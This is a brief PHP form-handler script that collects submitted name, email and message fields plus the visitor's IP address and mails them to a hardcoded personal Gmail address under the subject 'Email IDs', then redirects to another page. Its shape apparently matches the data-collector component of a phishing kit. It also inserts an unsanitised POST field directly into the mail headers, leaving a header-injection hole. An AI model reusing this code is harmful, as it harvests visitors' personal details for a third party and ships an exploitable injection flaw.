<?

$ip = getenv("REMOTE_ADDR");
$message .= "Name: ".$_POST['name']."\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Message: ".$_POST['message']."\n";
$message .= "IP: ".$ip."\n";
$message .= "\n";



$recipient = " prospererhunmwunse9@gmail.com";
$subject = "Email IDs";
$headers = "From: responders";
$headers .= $_POST['Editbox1']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: massage.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>